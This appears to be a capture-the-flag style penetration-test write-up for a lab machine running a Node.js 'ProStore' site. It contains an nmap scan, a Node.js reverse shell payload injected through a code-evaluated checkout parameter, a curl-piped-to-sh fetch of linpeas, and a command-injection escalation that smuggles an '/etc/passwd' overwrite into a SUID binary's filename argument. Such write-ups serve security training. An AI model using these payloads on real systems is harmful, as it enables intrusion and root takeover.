
## NMAP TCP

```nmap-tcp

?$ nmap -sC -sV -p- $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 17:25 UTC
Nmap scan report for 192.168.51.250
Host is up (0.00097s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1c:19:57:44:ae:0d:f4:06:b1:bc:ee:35:d0:c7:53:31 (ECDSA)
|_  256 cf:a2:3b:50:fd:d0:38:0f:4b:bb:68:2f:b9:a9:02:20 (ED25519)
80/tcp   closed http
443/tcp  closed https
5000/tcp open   http    Node.js (Express middleware)
|_http-title: ProStore
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.76 seconds

```

### Port 5000

Simple store site
Used burpsuite to map site and examine requests
captcha parameter on checkout endpoint gets executed as code

*Could only use port 80 on LHOST to make reverse shell work. Could not rev shell to usual port 9002 on kali box*

Used nodeJS shell with spaces replaced with + to make single non-space string for sending HTTP request:

```nodejs-rev-shell
(function(){+var+net+=+require("net"),+cp+=+require("child_process"),+sh+=+cp.spawn("sh",+[]);+var+client+=+new+net.Socket();+client.connect(80,+"192.168.49.51",function(){+client.pipe(sh.stdin);+sh.stdout.pipe(client);+sh.stderr.pipe(client);+});+return+/a/;})();
```

Got local flag

TTY Shell spawn:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```


### Privilege Escalation

Started with linpeas

```linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Found unknown SUID binary with root uid: /usr/local/bin/log_reader

used GDB with command list to see source is named log_reader.c

Used find to locate source:

```find-file-name
find / -name "log_reader.c"
```

Read Source code:

Takes in a filename as arg2 and concatenates with the cat command to then execute it

Ran:

```priv-esc
/usr/local/bin/log_reader "test.log&&echo root::0:0:root:/root:/bin/bash > /etc/passwd"
```

This modified root account to have no password
Then `su root`

**DONE**